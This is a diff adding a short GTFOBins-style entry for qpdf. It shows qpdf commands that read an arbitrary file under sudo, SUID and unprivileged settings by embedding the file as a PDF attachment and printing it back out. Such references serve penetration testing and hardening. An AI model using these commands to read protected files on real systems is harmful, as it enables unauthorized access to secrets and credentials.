@@ -1,0 +1,17 @@
+qpdf
+====
+
+File read
+---------
+
+[Sudo]
+    qpdf --empty --add-attachment /path/to/input-file --key=x -- /path/to/output-file
+qpdf --show-attachment=x /path/to/output-file
+
+[SUID]
+    qpdf --empty --add-attachment /path/to/input-file --key=x -- /path/to/output-file
+qpdf --show-attachment=x /path/to/output-file
+
+[Unprivileged]
+    qpdf --empty --add-attachment /path/to/input-file --key=x -- /path/to/output-file
+qpdf --show-attachment=x /path/to/output-file
